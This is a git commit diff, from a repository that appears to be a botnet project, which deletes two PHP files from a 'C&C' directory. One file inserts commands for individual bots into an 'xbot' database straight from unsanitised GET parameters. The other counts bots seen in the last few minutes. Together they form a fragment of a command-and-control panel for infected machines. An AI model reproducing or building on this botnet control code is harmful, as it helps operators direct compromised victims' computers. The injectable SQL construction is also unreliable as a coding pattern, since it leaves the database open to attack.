ffe43ca082e6c905229f9747cbf4c3a3c8e8f51a
DualCore <shadowek7@o2.pl>
2015-07-16 20:51:08 +0200

    fix

--- C&C/add_command.php
+++
@@ -1,9 +0,0 @@
-<?php
-$mysqli = new mysqli('localhost','root','','xbot');
-
-if(isset($_GET['id']) && isset($_GET['command']))
-//if(!
-    $mysqli->query("INSERT INTO `bots_commands` VALUES('".$_GET['id']."', '".$_GET['command']."')");
-  //  echo "failed";
-
-?>
--- C&C/bots_count.php
+++
@@ -1,8 +0,0 @@
-<?php
-mysql_connect('localhost','root','');
-mysql_select_db('xbot');
-$query="SELECT COUNT(*) FROM `bots_info` WHERE UNIX_TIMESTAMP(CURRENT_TIMESTAMP)-UNIX_TIMESTAMP(`LAST_SEEN`) < 315 ";
-$res=mysql_query($query);
-$row=mysql_fetch_assoc($res);
-echo $row['COUNT(*)'];
-?>
